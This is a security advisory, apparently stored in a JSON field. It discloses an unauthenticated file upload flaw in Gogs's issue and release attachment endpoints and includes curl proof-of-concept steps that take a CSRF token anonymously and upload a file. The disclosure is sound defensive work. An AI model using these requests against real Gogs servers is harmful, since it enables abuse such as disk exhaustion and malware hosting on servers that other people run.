    "Description": "Security Advisory:Unauthenticated File Upload in Gogs\nVulnerability Type: Unauthenticated File Upload\nDate: Aug 5, 2025\nDiscoverer: OpenAI Security Research\n\n## Summary\nGogs exposes unauthenticated file upload endpoints by default. When the global RequireSigninView setting is disabled (default), any remote user can upload arbitrary files to the server via /releases/attachments and /issues/attachments. This enables the instance to be abused as a public file host, potentially leading to disk exhaustion, content hosting, or delivery of malware. CSRF tokens do not mitigate this attack due to same-origin cookie issuance.\n\n## Affected Versions\n\n- Software: [Gogs](https://github.com/gogs/gogs/tree/main)\n- Confirmed Version(s): 28f83626d4ed0aa7b89493be2ea8b79ca038331e\n- Likely Affected: All versions since 2020-04-05 with unauthenticated attachments endpoints\n- Introduced Commit: 07818d5fa\n\n## Vulnerability Details\nThe web.go router exposes the following endpoints under the ignSignIn route group:\n\n### Vulnerable Code Snippet\n```\nm.Post(\"/issues/attachments\", repo.UploadIssueAttachment)\nm.Post(\"/releases/attachments\", repo.UploadReleaseAttachment)\n```\nThese endpoints are accessible by unauthenticated users if the configuration variable RequireSigninView is false (default). This allows arbitrary file uploads to data/attachments, returning a UUID in response.\n\nWhile CSRF protection is enabled, attackers can obtain a valid token anonymously from the site and use it in the upload request without authentication.\n## Description\nAnonymous file upload using only default configuration and a CSRF token obtained from the homepage.\n## POC\n```\n# Run Gogs docker \ndocker start gogs\n\n# Software will be run on http://localhost:10880/. Finish the setup with local Sqlite database\n\n# Get CSRF cookie into a jar\ncurl -sS -c cookies.txt http://localhost:10880/ -o /dev/null\n\n# Extract the _csrf value from the jar\nCSRF=\"$(awk '$6==\"_csrf\"{print $7}' cookies.txt | tail -n1)\"\n\n# Upload the file, sending cookie jar + header\ncurl -sS \\\n  -b cookies.txt -c cookies.txt \\\n  -H \"X-CSRF-Token: $CSRF\" \\\n  -H \"Referer: http://localhost:10880/\" \\\n  -F \"file=@image.png\" \\\n  http://localhost:10880/issues/attachments\n\n =\u003e {\"uuid\":\"\u003cUUID\u003e\"}\n```\nThe attachment will be available at: http://localhost:10880/attachments/\u003cuuid\u003e\n\n## Impact\n**Unrestricted File Upload:** Attackers can store arbitrary content on the server.\n**Denial-of-Service:** Repeated uploads can exhaust disk space.\n**Malware Hosting:** Gogs may inadvertently serve attacker-hosted payloads under its domain.\n\n## Realistic Exploitation Scenarios\n\n- Spammers or malicious actors use the Gogs instance to host phishing payloads or malware.\n- Attackers fill up disk with repeated uploads.\n- Attackers use hosted Gogs instances as public file dumps (e.g., for P2P, exfiltration)\n\n## Potential Impact\nThis unauthenticated upload vector effectively turns any Gogs instance into a file hosting platform open to the public. This is especially dangerous for production or Internet-exposed installations. The combination of no login requirement, wildcard MIME support, and unrestricted access to attachments enables both resource abuse and potential malware distribution.\n\n## Timeline\n\n- August 2025: Discovered via GPT5\n- August 2025: Reproduced and confirmed via PoC and sanitizer\n- Aug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new",
